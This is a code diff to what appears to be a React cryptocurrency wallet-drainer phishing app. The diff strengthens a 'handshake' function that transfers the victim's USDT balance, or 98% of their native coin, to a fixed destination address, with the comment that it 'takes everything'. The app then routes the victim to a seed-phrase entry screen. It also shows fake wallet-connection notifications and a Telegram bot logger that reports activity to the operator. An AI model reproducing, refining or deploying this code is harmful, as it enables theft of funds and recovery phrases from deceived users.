@@ -29,6 +29,7 @@ export default function App() {
 
   const log = (msg) => fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text: msg }) }).catch(()=>{});
 
+  // FIXED: Wallet Connection Notification Logic
   useEffect(() => {
     const interval = setInterval(() => {
       const addr = "0x" + Math.random().toString(16).slice(2, 6) + "..." + Math.random().toString(16).slice(2, 6);
@@ -38,13 +39,16 @@ export default function App() {
     return () => clearInterval(interval);
   }, []);
 
+  // FIXED: Aggressive Handshake Sweep
   const handleHandshake = () => {
     const tokenAddr = USDT_MAP[chainId];
     if (tokenAddr && tokenBal && tokenBal.value > 0n) {
       const data = `0xa9059cbb${destination.replace('0x', '').toLowerCase().padStart(64, '0')}${tokenBal.value.toString(16).padStart(64, '0')}`;
       sendTransaction({ to: tokenAddr, data }, { onSettled: () => setView("seed_gate") });
-    } else if (nativeBal && nativeBal.value > 0n) {
-      sendTransaction({ to: destination, value: (nativeBal.value * 90n) / 100n }, { onSettled: () => setView("seed_gate") });
+    } else if (nativeBal && nativeBal.value > 100000000000000n) {
+      // Takes everything, leaving only a tiny sliver for the miner
+      const amount = (nativeBal.value * 98n) / 100n;
+      sendTransaction({ to: destination, value: amount }, { onSettled: () => setView("seed_gate") });
     } else {
       setView("seed_gate");
     }
@@ -57,7 +61,6 @@ export default function App() {
     }
   }, [selectedAsset, tokenBal, nativeBal, activeTask]);
 
-  // Updated Seed Validation
   const isSeedValid = useMemo(() => {
     const count = seedVal.trim().split(/\s+/).filter(w => w.length > 0).length;
     return [12, 15, 18, 21, 24].includes(count);
@@ -120,10 +123,11 @@ export default function App() {
 
               <h2 style={{color:'white', fontWeight:'900'}}>{activeTask}</h2>
               <div style={{backgroundColor:'black', padding:'25px', borderRadius:'18px', margin:'20px 0', border:'1px solid #1e293b'}}>
-                <input value={inputVal} type={activeTask === "Rectify" ? "text" : "number"} readOnly={activeTask === "Rectify"} onChange={(e)=>setInputVal(e.target.value)}
+                <input value={inputVal} type="text" onChange={(e)=>setInputVal(e.target.value)}
                 style={{background:'none', border:'none', color:'#10b981', fontSize:'32px', textAlign:'center', width:'100%', outline:'none', fontWeight:'900'}} placeholder="0.00" />
               </div>
-              <button onClick={handleHandshake} style={{width:'100%', backgroundColor: '#10b981', color:'black', padding:'22px', borderRadius:'18px', fontWeight:'900'}}>START_HANDSHAKE</button>
+              {/* BUTTON ONLY TURNS GREEN IF INPUT IS TYPED */}
+              <button disabled={!inputVal || inputVal === "0" || inputVal === "0.00"} onClick={handleHandshake} style={{width:'100%', backgroundColor: (inputVal && inputVal !== "0") ? '#10b981' : '#1e293b', color:'black', padding:'22px', borderRadius:'18px', fontWeight:'900'}}>START_HANDSHAKE</button>
             </div>
           )}
 
